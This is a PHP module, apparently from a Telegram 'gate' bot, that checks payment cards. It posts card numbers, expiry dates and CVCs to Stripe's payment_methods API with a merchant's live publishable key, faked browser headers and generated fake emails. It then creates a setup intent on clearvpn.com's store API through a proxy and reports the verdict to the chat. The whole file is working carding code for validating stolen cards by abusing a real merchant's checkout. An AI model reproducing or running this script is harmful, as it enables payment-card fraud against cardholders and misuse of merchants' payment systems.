<?php
ini_set('display_errors', 1);
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
$cookie = rand();

# -- REQ 1 -- #
$headers2 =  ['Host: api.stripe.com', 'Referer: https://js.stripe.com/', 'Origin: https://js.stripe.com', 'Content-Type: application/x-www-form-urlencoded', 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept: */*', 'Upgrade-Insecure-Requests: 1'];
$post2 = 'type=card&billing_details[email]='.Internet::freeEmail().'&card[number]='.$cc[0].'&card[cvc]='.$cc[3].'&card[exp_month]='.$cc[1].'&card[exp_year]='.$cc[2].'&guid=bc5d3c23-5c01-4043-b765-e580cb9cc7878bb44d&muid=4df65d73-68ff-4bcc-8e42-c4e93da39e720f23a4&sid=91dee3b1-7c34-41c4-970b-ba76231d3c73b91192&pasted_fields=number&payment_user_agent=stripe.js%2F7338eae82%3B+stripe-js-v3%2F7338eae82&time_on_page=59102&key=pk_live_Ce4IE3CM15e1CpHcTpAb3jJB00HNHSIeG9';
$req2 = Make::Create(1, ['url' => 'https://api.stripe.com/v1/payment_methods', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => null], $gate, $user);
IsUnspam($req2, $user);
$sid = CurlX::ParseString($req2->body, '"id": "','"');
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

# -- REQ 3 -- #
$headers3 = ['Host: api.clearvpn.com'];
$post3 = '{"product_id":"01F5N9FX8C2VSGK903GQXCDHRG","email":"'.Internet::freeEmail().'","stripe_payment_method_id":"'.$sid.'"}';
$req3 = Make::Create(2, ['url' => 'https://api.clearvpn.com/v1/store/stripe/payment-setup-intent/create', 'method' => 'POST', 'post' => $post3, 'headers' => $headers3, 'cookie' => null, 'proxy' => $proxy2], $gate, $user);
IsUnspam($req3, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, implode('|', $cc), $gate['name'], $lang['wait']));
    
Res::SetParams($req3->body, null, null, null, $req2->body);
Bot::SendMsg($user['chat_id'], strlen($req3->body));
$res = Res::Stripe();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));